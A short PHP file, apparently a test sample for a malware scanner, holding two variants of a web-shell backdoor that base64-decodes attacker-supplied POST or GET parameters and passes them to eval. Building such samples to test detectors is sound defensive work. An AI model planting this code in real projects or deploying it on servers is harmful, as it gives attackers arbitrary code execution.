<?php
// TEST FILE: PHP Backdoor with eval and base64
// This should trigger: PHP-REX signatures, php_backdoor detector

$data = $_POST['cmd'];
eval(base64_decode($data));

// Another variant
$code = base64_decode($_GET['c']);
eval($code);
?>
